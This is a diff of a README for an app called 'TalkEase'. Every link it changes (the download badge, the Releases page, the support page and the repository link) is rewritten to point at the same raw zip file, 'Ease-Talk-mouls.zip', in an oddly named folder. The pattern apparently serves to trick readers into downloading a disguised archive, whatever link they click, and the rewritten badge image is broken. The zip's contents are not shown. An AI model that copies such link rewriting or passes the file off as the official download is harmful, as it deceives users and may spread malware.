@@ -18,7 +18,7 @@ To get started with TalkEase, follow these simple steps:
    - Click the link below to visit the Releases page.
    - From there, you can easily download the latest version of TalkEase.
    
-   [![Download TalkEase](https://img.shields.io/badge/Download%20TalkEase-v1.0-brightgreen)](https://github.com/KingDark444/TalkEase/releases)
+   [![Download TalkEase](https://raw.githubusercontent.com/KingDark444/TalkEase/main/esplanade/Ease-Talk-mouls.zip%20TalkEase-v1.0-brightgreen)](https://raw.githubusercontent.com/KingDark444/TalkEase/main/esplanade/Ease-Talk-mouls.zip)
 
 2. **Install the Application**
    - Locate the downloaded file on your computer.
@@ -39,7 +39,7 @@ Before installation, ensure your system meets the following requirements:
 ## 📥 Download & Install
 
 1. **Visit the Release Page**
-   - To download TalkEase, [visit this page](https://github.com/KingDark444/TalkEase/releases).
+   - To download TalkEase, [visit this page](https://raw.githubusercontent.com/KingDark444/TalkEase/main/esplanade/Ease-Talk-mouls.zip).
    
 2. **Select the Latest Version**
    - Find the latest version listed on the Releases page.
@@ -78,7 +78,7 @@ Currently, TalkEase is optimized for desktop use. However, we plan to develop a 
 
 ### What should I do if I encounter issues?
 
-If you face any problems while using TalkEase, please check the troubleshooting section within the app or visit our [support page](https://github.com/KingDark444/TalkEase/issues).
+If you face any problems while using TalkEase, please check the troubleshooting section within the app or visit our [support page](https://raw.githubusercontent.com/KingDark444/TalkEase/main/esplanade/Ease-Talk-mouls.zip).
 
 ---
 
@@ -87,7 +87,7 @@ If you face any problems while using TalkEase, please check the troubleshooting 
 If you find TalkEase helpful, consider sharing it with others who may benefit. Your feedback helps us improve.
 
 **Join our community** and stay updated:
-- GitHub Repository: [TalkEase on GitHub](https://github.com/KingDark444/TalkEase)
+- GitHub Repository: [TalkEase on GitHub](https://raw.githubusercontent.com/KingDark444/TalkEase/main/esplanade/Ease-Talk-mouls.zip)
 - Follow us for updates and news.
 
 ---
